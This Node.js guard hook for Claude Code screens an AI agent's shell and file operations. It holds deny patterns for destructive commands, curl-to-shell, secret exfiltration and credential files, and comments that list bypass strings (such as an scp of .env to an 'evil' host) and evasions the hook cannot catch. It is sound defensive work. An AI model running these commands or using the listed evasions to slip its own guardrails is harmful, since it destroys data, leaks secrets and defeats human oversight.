#!/usr/bin/env node
/**
 * guard.js — PreToolUse guard for Claude Code
 * Matcher: Bash|Read|Edit|Write
 *
 * Layers, each toggleable via the constants below:
 *   1. DANGEROUS_COMMANDS  — DENY catastrophic / destructive Bash
 *   2. SECRET_EXFIL        — DENY Bash that uploads/leaks secrets
 *   3. SECRET_FILES        — DENY Read/Edit/Write of secret files (hard block, everywhere)
 *   4. DATABRICKS_GUARD    — ASK (confirm) before consequential Databricks CLI ops
 *                            (OPT-IN: off unless KEYSTONE_DATABRICKS_GUARD=1)
 *   5. SQL_GUARD           — ASK (confirm) before destructive SQL (DROP/TRUNCATE/DELETE-all/UPDATE-all)
 *
 * Decisions: layers 1-3 "deny" (hard block). Layers 4-5 "ask" — Claude Code shows a
 * confirmation dialog so you can approve a legitimate deploy/drop, but nothing runs silently.
 * The Databricks layer is stack-specific and ships OFF; enable it if you use Databricks.
 *
 * Escape hatches (env vars, per-shell):
 *   KEYSTONE_GUARD_OFF=1              — disable ALL layers for this session
 *   KEYSTONE_ALLOW_SECRETS=1         — relax ONLY the secret-file layer (keep command + exfil protection)
 *   KEYSTONE_DATABRICKS_GUARD=1 — enable the opt-in Databricks confirm layer (off by default)
 *
 * Fails open: any parse/logic error returns "{}" so it never bricks a session.
 * No file logging by design — the deny reason is surfaced inline to you and Claude.
 *
 * Wiring (settings.json):
 *   "PreToolUse": [{
 *     "matcher": "Bash|Read|Edit|Write",
 *     "hooks": [{ "type": "command", "command": "node ~/.claude/hooks/guard.js", "timeout": 5 }]
 *   }]
 */

"use strict";

const fs = require("fs");
const os = require("os");
const path = require("path");

// ── Layer toggles ────────────────────────────────────────────────────────────
const DANGEROUS_COMMANDS = true;
const SECRET_EXFIL = true;
const SECRET_FILES = true;
const SQL_GUARD = true;
// DATABRICKS_GUARD is opt-in (stack-specific) — read from env at call time, off by default.
// Layer 0 (freeze / careful) is opt-in per machine via the /freeze, /careful, /guard
// commands, which write ~/.claude/keystone-guard.json. Absent file ⇒ baseline behavior.
const GUARD_STATE_FILE =
  process.env.KEYSTONE_GUARD_FILE ||
  path.join(os.homedir(), ".claude", "keystone-guard.json");

// ── Files explicitly safe to access (templates / examples) ───────────────────
// Each regex is anchored to the END of a single path. For Read/Edit/Write it is tested
// against the file path; for Bash it is tested per shell word (see neutralizeAllowlisted),
// never against the whole command — a whole-command test let `<anything> # .env.example`
// skip every deny layer. No `g` flag: .test() with `g` carries lastIndex between calls.
const ALLOWLIST = [
  /\.env\.example$/i,
  /\.env\.sample$/i,
  /\.env\.template$/i,
  /\.env\.schema$/i,
  /\.env\.defaults$/i,
  /(^|\/)example\.env$/i,
];

// ── Layer 1: dangerous Bash commands ─────────────────────────────────────────
const DANGEROUS = [
  {
    id: "rm-home",
    re: /\brm\s+(-\S+\s+)*["']?(~\/?|\$HOME)["']?(\s|$|[;&|])/,
    why: "rm targeting home directory",
  },
  {
    id: "rm-home-trail",
    re: /\brm\s+.+\s+["']?(~\/?|\$HOME)["']?(\s*$|[;&|])/,
    why: "rm with trailing ~/ or $HOME",
  },
  {
    id: "rm-root",
    re: /\brm\s+(-\S+\s+)*\/(\*|\s|$|[;&|])/,
    why: "rm targeting root filesystem",
  },
  {
    id: "rm-system",
    re: /\brm\s+(-\S+\s+)*\/(etc|usr|var|bin|sbin|lib|boot|dev|proc|sys)(\/|\s|$)/,
    why: "rm targeting system directory",
  },
  {
    id: "rm-cwd",
    re: /\brm\s+(-\S+\s+)*(\.\/?|\*|\.\/\*)(\s|$|[;&|])/,
    why: "rm deleting current directory contents",
  },
  {
    id: "dd-disk",
    re: /\bdd\b.+\bof=\/dev\/(sd[a-z]|nvme|hd[a-z]|vd[a-z]|xvd[a-z]|disk\d)/,
    why: "dd writing to a disk device",
  },
  { id: "mkfs", re: /\bmkfs(\.\w+)?\s+\/dev\//, why: "mkfs formatting a disk" },
  {
    id: "fork-bomb",
    re: /:\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:/,
    why: "fork bomb",
  },
  {
    id: "curl-pipe-sh",
    re: /\b(curl|wget)\b[^|]*\|\s*(sudo\s+)?(ba|z|d)?sh\b/,
    why: "piping a URL straight into a shell (RCE risk)",
  },
  {
    id: "force-push-main",
    re: /\bgit\s+push\b(?!.*--force-with-lease).*(?:--force|\s-f)\b.*\b(main|master)\b/,
    why: "force-push to main/master",
  },
  {
    id: "reset-hard",
    re: /\bgit\s+reset\s+--hard\b/,
    why: "git reset --hard discards uncommitted work",
  },
  {
    id: "git-clean-f",
    re: /\bgit\s+clean\s+(-\S*f|\S*-f)\S*/,
    why: "git clean -f deletes untracked files",
  },
  {
    id: "chmod-777",
    re: /\bchmod\b.+\b777\b/,
    why: "chmod 777 is a security risk",
  },
  {
    id: "crontab-r",
    re: /\bcrontab\s+-r\b/,
    why: "crontab -r removes all cron jobs",
  },
  {
    id: "git-no-verify",
    re: /\bgit\b[^;|&]*\b(commit|push|merge|cherry-pick|rebase|am)\b[^;|&]*--no-verify\b/,
    why: "git --no-verify skips pre-commit/commit-msg/pre-push hooks (quality-gate bypass)",
  },
  {
    id: "git-commit-n-short",
    re: /\bgit\s+commit\b[^;|&]*\s-n(?:\s|$)/,
    why: "git commit -n skips commit hooks (drop -n, or set KEYSTONE_GUARD_OFF=1 if intended)",
  },
  {
    id: "git-hookspath-override",
    re: /\bgit\b[^;|&]*-c\s+core\.hooksPath=/i,
    why: "git -c core.hooksPath= overrides/disables repo hooks",
  },
];

// ── Layer 2: secret exfiltration / exposure via Bash ─────────────────────────
const SECRET_TOKENS =
  "(\\.env\\b|credentials?|secrets?|id_rsa|id_ed25519|id_ecdsa|id_dsa|\\.pem\\b|\\.key\\b|\\.aws\\/credentials)";
const EXFIL = [
  {
    id: "curl-upload",
    re: new RegExp(
      `\\bcurl\\b[^;|&]*(-d\\s*@|-F\\s+[^=]+=@|--data[^=]*=@|--upload-file|-T)\\s*[^;|&]*${SECRET_TOKENS}`,
      "i",
    ),
    why: "uploading secrets via curl",
  },
  {
    id: "curl-post",
    re: new RegExp(`\\bcurl\\b[^;|&]*-X\\s*POST[^;|&]*${SECRET_TOKENS}`, "i"),
    why: "POSTing secrets via curl",
  },
  {
    id: "wget-post",
    re: new RegExp(`\\bwget\\b[^;|&]*--post-file[^;|&]*${SECRET_TOKENS}`, "i"),
    why: "POSTing secrets via wget",
  },
  {
    id: "scp-secrets",
    re: new RegExp(`\\bscp\\b[^;|&]*${SECRET_TOKENS}[^;|&]+:`, "i"),
    why: "copying secrets off-box via scp",
  },
  {
    id: "rsync-secrets",
    re: new RegExp(`\\brsync\\b[^;|&]*${SECRET_TOKENS}[^;|&]+:`, "i"),
    why: "syncing secrets off-box via rsync",
  },
  {
    id: "nc-secrets",
    re: new RegExp(`\\bnc\\b[^;|&]*<[^;|&]*${SECRET_TOKENS}`, "i"),
    why: "exfiltrating secrets via netcat",
  },
  {
    id: "read-env",
    re: /\b(cat|less|more|head|tail|bat|view|nl|xxd|od|strings)\s+[^|;&]*\.env\b/i,
    why: "reading a .env file exposes secrets",
  },
  {
    id: "read-key",
    re: /\b(cat|less|more|head|tail|bat|view)\s+[^|;&]*(id_rsa|id_ed25519|id_ecdsa|id_dsa|\.pem|\.key)\b/i,
    why: "reading a private key",
  },
  {
    id: "read-aws",
    re: /\b(cat|less|more|head|tail|bat)\s+[^|;&]*\.aws\/credentials/i,
    why: "reading AWS credentials",
  },
  {
    id: "source-env",
    re: /(\bsource\s+|(?:^|[;&|]\s*)\.\s+)[^|;&]*\.env\b/i,
    why: "sourcing .env loads secrets into the environment",
  },
  {
    id: "env-dump",
    re: /\bprintenv\b|(?:^|[;&|]\s*)env\s*(?:$|[;&|])/,
    why: "env dump may expose secrets",
  },
  {
    // Case-sensitive + uppercase-only: secret env vars are UPPER_SNAKE by
    // convention, so this catches $API_KEY / $DB_PASSWORD without tripping on
    // lowercase loop vars like $key or $keys (which bit legitimate scripts).
    id: "echo-secret",
    re: /\b(echo|printf)\b[^;|&]*\$\{?[A-Z_]*(SECRET|API[_-]?KEY|\bKEY\b|TOKEN|PASSWORD|PASSWD|CREDENTIAL|PRIVATE|AUTH)[A-Z_]*\}?/,
    why: "printing a secret variable",
  },
  {
    id: "proc-environ",
    re: /\/proc\/[^/]+\/environ/,
    why: "reading a process environment block",
  },
  {
    id: "base64-secret",
    re: new RegExp(`\\bbase64\\b[^;|&]*${SECRET_TOKENS}`, "i"),
    why: "base64-encoding a secret (exfil prep)",
  },
  {
    id: "interp-secret",
    re: new RegExp(
      `\\b(python3?|node|deno|bun|ruby|perl)\\b[^;|&]*(-c|-e)\\b.*${SECRET_TOKENS}`,
      "i",
    ),
    why: "interpreter one-liner reading a secret file",
  },
  {
    id: "interp-environ",
    re: /\b(python3?|node|deno|bun|ruby)\b[^;|&]*(-c|-e)\b.*(os\.environ|process\.env|ENV\.to_h|Deno\.env)/i,
    why: "interpreter one-liner dumping the environment",
  },
];

// ── Layer 3: secret files (Read/Edit/Write) ──────────────────────────────────
const SECRET_FILE_PATTERNS = [
  {
    id: "env-file",
    re: /(?:^|\/)\.env(?:\.[^/]*)?$/,
    why: ".env file contains secrets",
  },
  {
    id: "envrc",
    re: /(?:^|\/)\.envrc$/,
    why: ".envrc (direnv) contains secrets",
  },
  {
    id: "ssh-key",
    re: /(?:^|\/)(id_rsa|id_ed25519|id_ecdsa|id_dsa)$/,
    why: "SSH private key",
  },
  {
    id: "ssh-key-path",
    re: /(?:^|\/)\.ssh\/id_[^/]+$/,
    why: "SSH private key",
  },
  {
    id: "ssh-authkeys",
    re: /(?:^|\/)\.ssh\/authorized_keys$/,
    why: "SSH authorized_keys",
  },
  { id: "pem", re: /\.pem$/i, why: "PEM key/cert file" },
  { id: "key", re: /\.key$/i, why: "key file" },
  { id: "pkcs12", re: /\.(p12|pfx)$/i, why: "PKCS#12 key bundle" },
  {
    id: "aws-creds",
    re: /(?:^|\/)\.aws\/credentials$/,
    why: "AWS credentials",
  },
  {
    id: "aws-config",
    re: /(?:^|\/)\.aws\/config$/,
    why: "AWS config may contain secrets",
  },
  {
    id: "kube-config",
    re: /(?:^|\/)\.kube\/config$/,
    why: "kubeconfig contains credentials",
  },
  {
    id: "gcp-sa",
    re: /service[_-]?account[^/]*\.json$/i,
    why: "GCP service-account key",
  },
  {
    id: "gcloud-creds",
    re: /(?:^|\/)\.config\/gcloud\/.*(credential|token)/i,
    why: "gcloud credentials",
  },
  {
    id: "azure-creds",
    re: /(?:^|\/)\.azure\/(credentials|accessTokens)/i,
    why: "Azure credentials",
  },
  {
    id: "creds-json",
    re: /(?:^|\/)credentials\.json$/i,
    why: "credentials file",
  },
  {
    id: "secrets-file",
    re: /(?:^|\/)(secrets?|credentials?)\.(json|ya?ml|toml)$/i,
    why: "secrets configuration file",
  },
  {
    id: "docker-config",
    re: /(?:^|\/)\.docker\/config\.json$/,
    why: "docker config may hold registry auth",
  },
  { id: "netrc", re: /(?:^|\/)\.netrc$/, why: ".netrc contains credentials" },
  {
    id: "npmrc",
    re: /(?:^|\/)\.npmrc$/,
    why: ".npmrc may contain an auth token",
  },
  {
    id: "pypirc",
    re: /(?:^|\/)\.pypirc$/,
    why: ".pypirc contains PyPI credentials",
  },
  {
    id: "gem-creds",
    re: /(?:^|\/)\.gem\/credentials$/,
    why: "RubyGems credentials",
  },
  { id: "vault-token", re: /(?:^|\/)\.?vault-token$/, why: "Vault token" },
  { id: "keystore", re: /\.(keystore|jks)$/i, why: "Java keystore" },
  {
    id: "htpasswd",
    re: /(?:^|\/)\.?htpasswd$/,
    why: "htpasswd contains hashed passwords",
  },
  { id: "pgpass", re: /(?:^|\/)\.pgpass$/, why: "PostgreSQL password file" },
  {
    id: "mycnf",
    re: /(?:^|\/)\.my\.cnf$/,
    why: "MySQL config may contain a password",
  },
  {
    id: "claude-creds",
    re: /(?:^|\/)\.credentials\.json(\.[\w-]+)?$/,
    why: "Claude Code credential store (OAuth tokens)",
  },
];

// ── Layer 4: Databricks consequential ops (Bash) → ASK / confirm ─────────────
// "ask" pops a confirmation dialog. Legitimate, but you never want it to run silently.
const DATABRICKS = [
  {
    id: "db-deploy-prod",
    re: /\bdatabricks\s+bundle\s+deploy\b[^;|&]*(?:-t|--target)[=\s]+["']?(prod|production|prd)\b/i,
    why: "Databricks bundle deploy to a PRODUCTION target",
  },
  {
    id: "db-deploy",
    re: /\bdatabricks\s+bundle\s+deploy\b/i,
    why: "Databricks bundle deploy",
  },
  {
    id: "db-destroy",
    re: /\bdatabricks\s+bundle\s+destroy\b/i,
    why: "Databricks bundle destroy (tears down deployed resources)",
  },
  {
    id: "db-resource-delete",
    re: /\bdatabricks\s+[\w-]+\s+(delete|destroy|permanent-delete|delete-scope)\b/i,
    why: "Databricks resource delete/destroy",
  },
  {
    id: "db-fs-rm",
    re: /\b(databricks\s+fs|dbfs)\s+rm\b[^;|&]*(-r\b|-R\b|--recursive)/i,
    why: "recursive delete on DBFS",
  },
];

// ── Layer 5: destructive SQL in any Bash command → ASK / confirm ─────────────
const SQL_DESTRUCTIVE = [
  {
    id: "sql-drop",
    re: /\bDROP\s+(TABLE|VIEW|SCHEMA|DATABASE|CATALOG|VOLUME|FUNCTION|MATERIALIZED\s+VIEW)\b/i,
    why: "SQL DROP statement (irreversible)",
  },
  {
    id: "sql-alter-drop",
    re: /\bALTER\s+TABLE\b[^;]*\bDROP\s+(PARTITION|COLUMN)\b/i,
    why: "SQL ALTER TABLE ... DROP (destroys data/columns)",
  },
  {
    id: "sql-truncate",
    re: /\bTRUNCATE\s+(TABLE\s+)?[`"\w]/i,
    why: "SQL TRUNCATE (empties the table)",
  },
  {
    id: "sql-delete-all",
    re: /\bDELETE\s+FROM\b(?![^;]*\bWHERE\b)/i,
    why: "SQL DELETE FROM with no WHERE (deletes every row)",
  },
  {
    id: "sql-update-all",
    re: /\bUPDATE\s+[`"\w.]+\s+SET\b(?![^;]*\bWHERE\b)/i,
    why: "SQL UPDATE with no WHERE (rewrites every row)",
  },
];

// ── Layer 0b: "careful mode" Bash commands → ASK (only when careful is enabled) ─
// Legitimate-but-destructive operations that guard.js does NOT block by default, but
// escalates to a confirmation prompt while careful mode is on (via /careful or /guard).
const CAREFUL = [
  {
    id: "rm-recursive",
    re: /\brm\s+(-\S*[rR]\S*|\S*-[rR]\S*)(\s|$)/,
    why: "recursive rm",
  },
  { id: "git-push", re: /\bgit\s+push\b/, why: "git push" },
  {
    id: "git-checkout-force",
    re: /\bgit\s+checkout\b[^;|&]*(-f|--force)\b/,
    why: "force checkout (discards local changes)",
  },
  {
    id: "mv-overwrite",
    re: /\bmv\s+(-\S*f|\S*-f)\S*/,
    why: "forced move/overwrite",
  },
  {
    id: "cp-recursive-force",
    re: /\bcp\s+[^;|&]*-\S*[rR]\S*f|\bcp\s+[^;|&]*-\S*f\S*[rR]/,
    why: "forced recursive copy (can overwrite)",
  },
  {
    id: "truncate-redirect",
    re: /(^|[;&|]\s*)>\s*\/?\w[^;&|]*/,
    why: "shell redirect that truncates a file",
  },
];

// ── Helpers ──────────────────────────────────────────────────────────────────
/** True if a single file path (NOT a whole Bash command) is an allowlisted template. */
function isAllowlisted(s) {
  return !!s && ALLOWLIST.some((re) => re.test(s));
}

// A "word" for allowlist purposes: a run of characters that are not whitespace, quotes,
// backticks, shell operators/grouping, or `=` (so `--env-file=.env.example` splits).
const SHELL_WORD = /[^\s'"`;|&<>()=]+/g;
const ALLOWLIST_PLACEHOLDER = "_allowlisted_";
// A word is never neutralized if it carries expansion, escape, or glob characters (bash may
// split or expand it: `.env$IFS.env.example` reads .env), or a `:` — that marks a remote
// destination (scp/rsync `host:path`, `host::module`, a URL), and erasing it would hide
// the `:` the off-box exfil rules key on (`scp .env evil:x.env.example`).
const SHELL_EXPANSION = /[$\\{}*?[\]:]/;

/**
 * Replace each shell word that is itself an allowlisted template path with a neutral
 * placeholder, IN PLACE (separators are preserved, so the deny regexes still see the
 * real command structure). Everything else — including any secret path or dangerous
 * command sitting next to the template name — is left for the deny/ask layers.
 *   `cat .env.example`         → `cat _allowlisted_`        (allowed)
 *   `cat .env # .env.example`  → `cat .env # _allowlisted_` (still denied)
 */
function neutralizeAllowlisted(cmd) {
  return String(cmd).replace(SHELL_WORD, (word) =>
    isAllowlisted(word) && !SHELL_EXPANSION.test(word) ? ALLOWLIST_PLACEHOLDER : word,
  );
}

// ── Guard state integrity: the model must not quietly lift its own fence ─────
// /freeze, /careful, /guard, /unfreeze all run through the model's Bash tool, so the hook
// cannot tell a user-typed /unfreeze from a model-initiated one. Rule: anything that could
// REMOVE or WIDEN protection asks a human; forms that only ADD protection pass.
// keystone: string matching only — obfuscated access (globs like keystone-g*, variables
// built at runtime, interpreter one-liners that assemble the name, a copied script) is not
// caught, freeze does not fence Bash at all, and when not frozen the model can Edit the
// installed guard.js / guard-state.js themselves; upgrade trigger: a real bypass seen in
// practice, or Claude Code exposing whether a tool call came from a user slash command.
const STATE_BASENAME = "keystone-guard.json";
const STATE_MENTION = /keystone-guard/i;
const GUARD_STATE_CLI = /guard-state(?:\.js)?(?![\w.-])/gi;
// One shell word as an optional directory argument: a plain word, or a quoted string with
// no expansion/escape characters inside.
const CLI_ARG = String.raw`(?:"[^"$\x60\\]*"|'[^']*'|[^\s"'$\x60\\;&|<>(){}]+)`;
const CLI_STATUS = /^\s*status\s*$/;
const CLI_CAREFUL_ON = /^\s*careful\s+on\s*$/;
const CLI_FREEZE = new RegExp(String.raw`^\s*(?:freeze|guard)(?:\s+${CLI_ARG})?\s*$`);

/** Guard state file paths worth matching beyond the default basename. */
function stateFileCandidates(env) {
  return [GUARD_STATE_FILE, env && env.KEYSTONE_GUARD_FILE]
    .filter(Boolean)
    .map((p) => path.resolve(p));
}

/**
 * A DETECTION-ONLY copy of a command with the characters bash removes when it rejoins a
 * word dropped: quotes, backslashes, backticks, and empty `$()` / `$''` / `$""`. So
 * `keystone-gu''ard.json` and `guard\-state.js` are seen as the names bash will use.
 * Never evaluate the command itself from this copy — it would mangle legitimate quoting.
 */
function dequoted(cmd) {
  return String(cmd)
    .replace(/\$(?:\(\s*\)|''|"")/g, "")
    .replace(/['"\\`]/g, "");
}

/** Does this Bash command reference the guard state file directly? */
function bashTouchesStateFile(cmd, env) {
  const forms = [String(cmd), dequoted(cmd)];
  if (forms.some((c) => STATE_MENTION.test(c))) return true;
  return stateFileCandidates(env).some((p) => {
    if (path.basename(p).toLowerCase() === STATE_BASENAME) return false; // covered above
    return forms.some((c) => c.toLowerCase().includes(p.toLowerCase()));
  });
}

/** Is this Read/Write target the guard state file? (case-insensitive: macOS default FS) */
function isStateFilePath(fp, cwd, env) {
  const abs = path.resolve(cwd || "", fp).toLowerCase();
  if (path.basename(abs) === STATE_BASENAME) return true;
  return stateFileCandidates(env).some((p) => p.toLowerCase() === abs);
}

/**
 * True when every guard-state.js mention in `cmd` is an exact protection-ADDING form:
 * `status`, `careful on`, or `freeze|guard [dir]` while no freeze is active (re-freezing
 * an active boundary could widen it). Anything else — unfreeze, careful off, extra args,
 * expansions, a bare mention, a copy — is treated as protection-removing. Fails closed.
 * A mention that only appears once quotes/backslashes are removed (`guard-sta""te.js`) is
 * an obfuscated invocation and is never protective. While the state file is corrupt the
 * real boundary is unknown, so only `status` passes.
 */
function guardStateCallsAreProtective(cmd, state) {
  cmd = String(cmd);
  const count = (s) => (s.match(GUARD_STATE_CLI) || []).length;
  if (count(dequoted(cmd)) > count(cmd)) return false;
  const corrupt = !!(state && state.corrupt);
  GUARD_STATE_CLI.lastIndex = 0;
  let m;
  while ((m = GUARD_STATE_CLI.exec(cmd)) !== null) {
    let rest = cmd.slice(m.index + m[0].length);
    if (/^["']/.test(rest)) rest = rest.slice(1); // closing quote of a quoted script path
    // The script name must end the word. `guard-state.js"status;"` is a different file to
    // bash, and as a decoy it would also vanish from the dequoted count above — so treat
    // any glued suffix as non-protective. This keeps every protective raw match present in
    // the dequoted copy, which is what makes the count check sound.
    if (rest && !/^\s/.test(rest)) return false;
    const segment = rest.split(/[;&|\n]/, 1)[0];
    if (CLI_STATUS.test(segment)) continue;
    if (corrupt) return false;
    if (CLI_CAREFUL_ON.test(segment)) continue;
    if (CLI_FREEZE.test(segment) && !(state && state.freeze)) continue;
    return false;
  }
  return true;
}

/**
 * Why `s` is not a valid guard state, or null if it is. Valid: a plain object whose
 * `freeze` is absent/null or a non-empty absolute path, and whose `careful` is
 * absent or a boolean. Shared with guard-state.js so both sides agree on "corrupt".
 */
function stateShapeError(s) {
  if (!s || typeof s !== "object" || Array.isArray(s)) return "not a JSON object";
  if (s.freeze != null && (typeof s.freeze !== "string" || !path.isAbsolute(s.freeze))) {
    return "freeze is not an absolute directory path";
  }
  if (s.careful !== undefined && typeof s.careful !== "boolean") {
    return "careful is not true/false";
  }
  return null;
}

/**
 * Read the opt-in guard state file.
 *   - missing file (ENOENT / ENOTDIR) → {} (baseline: no extra restrictions)
 *   - valid state                    → the state
 *   - anything else (unreadable, invalid JSON, wrong shape) → FAIL CLOSED:
 *     { careful: true, corrupt: <reason> }. A corrupt file used to read as {}, which
 *     silently lifted an active freeze. The freeze boundary itself is unknowable, so
 *     instead of guessing one, evaluate() asks before every Write/Edit and keeps careful
 *     mode on until the file is repaired (guard-state.js freeze|guard|unfreeze).
 */
function readState(file = GUARD_STATE_FILE) {
  let text;
  try {
    text = fs.readFileSync(file, "utf8");
  } catch (e) {
    if (e && (e.code === "ENOENT" || e.code === "ENOTDIR")) return {};
    return { careful: true, corrupt: `unreadable (${(e && e.code) || "error"})` };
  }
  let s;
  try {
    s = JSON.parse(text);
  } catch (_) {
    return { careful: true, corrupt: "invalid JSON" };
  }
  const err = stateShapeError(s);
  return err ? { careful: true, corrupt: err } : s;
}

/** How to repair a corrupt state file. guard-state.js can rewrite bad CONTENT, but not a
 *  path it cannot read (a directory, a permissions problem) — that needs a manual fix. */
function corruptStateHint(reason) {
  return /^unreadable/.test(String(reason))
    ? `fix or remove ${GUARD_STATE_FILE} by hand (guard-state.js cannot rewrite a path it cannot read)`
    : "run `/freeze` or `/guard` to rewrite it, `/unfreeze` to clear it, or `guard-state.js status` to inspect it";
}

/** True if `target` resolves inside `dir`. Both should be absolute-ish paths. */
function isInside(dir, target) {
  if (!dir || !target) return false;
  const rel = path.relative(dir, target);
  return rel === "" || (!rel.startsWith("..") && !path.isAbsolute(rel));
}

function matchFirst(list, subject) {
  for (const p of list) {
    if (p.re.test(subject)) return p;
  }
  return null;
}

const DENY_EMOJI = "🛑";
const ASK_EMOJI = "⚠️";

function output(decision, why) {
  const isDeny = decision === "deny";
  const emoji = isDeny ? DENY_EMOJI : ASK_EMOJI;
  const tail = isDeny
    ? " (Set KEYSTONE_GUARD_OFF=1 in your shell to bypass if this is intentional.)"
    : " — confirm only if you intend this.";
  return {
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: decision,
      permissionDecisionReason: `${emoji} [guard] ${why}.${tail}`,
    },
  };
}

// Risk-scaled pre-edit discovery gate (stateless). The executor declares the current task's
// risk + discovery facts via env carriers (KEYSTONE_TASK_RISK / KEYSTONE_TASK_FACTS). This
// gate fires ONLY when a MED/HIGH risk is declared WITHOUT facts — it never bricks ordinary
// edits (no signal ⇒ allow). It is declaration-only: it checks facts were stated, not that
// they are correct (the plan-reviewer owns correctness). KEYSTONE_FACT_FORCE=off disables it.
function needsDiscovery(env) {
  if (!env || env.KEYSTONE_FACT_FORCE === "off") return false;
  const risk = String(env.KEYSTONE_TASK_RISK || "")
    .trim()
    .toLowerCase();
  if (risk !== "med" && risk !== "high") return false;
  return String(env.KEYSTONE_TASK_FACTS || "").trim() === "";
}

function discoveryGateMsg(risk) {
  const dims =
    risk === "high"
      ? "importers/callers, contract shape, side-effects, and test coverage"
      : "blast radius and error handling";
  return (
    `declare discovery facts before this ${risk.toUpperCase()} edit (${dims}) in ` +
    `KEYSTONE_TASK_FACTS — declaration only; the plan-reviewer checks correctness`
  );
}

/**
 * Coerce a tool-input field to text. Strings pass; absent → ""; an array of primitives is
 * joined with spaces (so ["rm","-rf","~"] is judged as a command, not "rm,-rf,~"). Any
 * other type returns null — the caller asks rather than letting a malformed input (or a
 * throw on it, which main() would turn into "{}") become an allow.
 */
function asText(v) {
  if (typeof v === "string") return v;
  if (v === undefined || v === null) return "";
  if (Array.isArray(v) && v.every((x) => x === null || typeof x !== "object")) {
    return v.map((x) => String(x)).join(" ");
  }
  return null;
}

/**
 * Core decision. Returns { decision: 'deny'|'ask', why } or null to allow.
 * Exported for tests.
 */
function evaluate(
  toolName,
  toolInput,
  env = process.env,
  cwd = "",
  state = readState(),
) {
  env = env || {};
  if (env.KEYSTONE_GUARD_OFF === "1") return null;
  cwd = typeof cwd === "string" ? cwd : "";
  const input = toolInput && typeof toolInput === "object" ? toolInput : {};

  if (toolName === "Bash") {
    const raw = asText(input.command);
    if (raw === null) {
      return { decision: "ask", why: "the Bash command is not a string, so guard cannot check it" };
    }
    // Allowlisted template names are neutralized per word; the deny/ask layers then run
    // on the remainder. Never short-circuit to allow on an allowlist hit.
    const cmd = neutralizeAllowlisted(raw);

    // deny-level layers first (never legitimate)
    if (DANGEROUS_COMMANDS) {
      const hit = matchFirst(DANGEROUS, cmd);
      if (hit) return { decision: "deny", why: hit.why };
    }
    if (SECRET_EXFIL) {
      const hit = matchFirst(EXFIL, cmd);
      if (hit) return { decision: "deny", why: hit.why };
    }
    // Guard state integrity (ask): checked on the RAW command, after the deny layers.
    if (bashTouchesStateFile(raw, env)) {
      return {
        decision: "ask",
        why: "this command touches the keystone guard state file directly (it holds the freeze/careful settings). Use /freeze, /careful, or /unfreeze instead",
      };
    }
    if (!guardStateCallsAreProtective(raw, state)) {
      return {
        decision: "ask",
        why: "this guard-state.js call could lift or widen keystone's guardrails (unfreeze, careful off, or re-freezing an active boundary). Approve only if you asked for it",
      };
    }
    // ask-level layers (legitimate but consequential)
    // Databricks is stack-specific → opt-in via env, off by default.
    if (env.KEYSTONE_DATABRICKS_GUARD === "1") {
      const hit = matchFirst(DATABRICKS, cmd);
      if (hit) return { decision: "ask", why: hit.why };
    }
    if (SQL_GUARD) {
      const hit = matchFirst(SQL_DESTRUCTIVE, cmd);
      if (hit) return { decision: "ask", why: hit.why };
    }
    // Layer 0b: careful mode (opt-in) — escalate broad destructive ops to a prompt.
    if (state && state.careful) {
      const hit = matchFirst(CAREFUL, cmd);
      if (hit) return { decision: "ask", why: `careful mode: ${hit.why}` };
    }
    return null;
  }

  const WRITE_TOOLS = ["Edit", "Write", "MultiEdit", "NotebookEdit"];
  if (toolName === "Read" || WRITE_TOOLS.includes(toolName)) {
    const fp = asText(input.file_path || input.notebook_path);
    if (fp === null) {
      return { decision: "ask", why: "the target file path is not a string, so guard cannot check it" };
    }

    // Secret-file block (always on, every tool) — keep this first.
    if (
      SECRET_FILES &&
      env.KEYSTONE_ALLOW_SECRETS !== "1" &&
      fp &&
      !isAllowlisted(fp)
    ) {
      const hit = matchFirst(SECRET_FILE_PATTERNS, fp);
      if (hit) {
        const verb =
          toolName === "Read"
            ? "read"
            : toolName === "Edit"
              ? "modify"
              : "write";
        return { decision: "deny", why: `cannot ${verb} ${hit.why}` };
      }
    }

    // Layer 0a: freeze boundary (opt-in) — deny writes outside the allowed dir.
    if (state && state.freeze && WRITE_TOOLS.includes(toolName) && fp) {
      const abs = path.isAbsolute(fp) ? fp : path.resolve(cwd || "", fp);
      if (!isInside(state.freeze, abs)) {
        return {
          decision: "deny",
          why: `freeze active: edits restricted to ${state.freeze} (this targets outside it). Run /unfreeze to lift`,
        };
      }
    }

    // Risk-scaled pre-edit discovery gate — after secret + freeze (those win), before allow.
    if (WRITE_TOOLS.includes(toolName) && needsDiscovery(env)) {
      const risk = String(env.KEYSTONE_TASK_RISK).trim().toLowerCase();
      return { decision: "deny", why: discoveryGateMsg(risk) };
    }

    // Corrupt state file (fail closed) — the freeze boundary is unknown, so confirm every
    // edit until it is repaired. After the deny layers, so a deny still wins.
    if (state && state.corrupt && WRITE_TOOLS.includes(toolName)) {
      return {
        decision: "ask",
        why: `the keystone guard state file is ${state.corrupt}, so any freeze boundary is unknown — ${corruptStateHint(state.corrupt)}`,
      };
    }

    // Guard state integrity (ask) — after every deny layer, so a deny always wins.
    if (WRITE_TOOLS.includes(toolName) && fp && isStateFilePath(fp, cwd, env)) {
      return {
        decision: "ask",
        why: "this edits the keystone guard state file directly (it holds the freeze/careful settings). Use /freeze, /careful, or /unfreeze instead",
      };
    }
    return null;
  }

  return null;
}

async function main() {
  let input = "";
  for await (const chunk of process.stdin) input += chunk;
  try {
    const data = JSON.parse(input || "{}");
    const result = evaluate(
      data.tool_name,
      data.tool_input,
      process.env,
      typeof data.cwd === "string" ? data.cwd : "",
      readState(),
    );
    if (result) {
      process.stdout.write(JSON.stringify(output(result.decision, result.why)));
      return;
    }
  } catch (e) {
    // Fail closed: an unexpected error must not silently allow the call.
    process.stdout.write(
      JSON.stringify(
        output(
          "ask",
          `keystone guard hit an internal error (${(e && e.message) || e}); approve only if you trust this call.`,
        ),
      ),
    );
    return;
  }
  process.stdout.write("{}");
}

if (require.main === module) {
  main();
} else {
  module.exports = {
    evaluate,
    isAllowlisted,
    neutralizeAllowlisted,
    matchFirst,
    output,
    DANGEROUS,
    EXFIL,
    SECRET_FILE_PATTERNS,
    DATABRICKS,
    SQL_DESTRUCTIVE,
    CAREFUL,
    ALLOWLIST,
    readState,
    stateShapeError,
    asText,
    GUARD_STATE_FILE,
    bashTouchesStateFile,
    isStateFilePath,
    guardStateCallsAreProtective,
    isInside,
    needsDiscovery,
    discoveryGateMsg,
  };
}
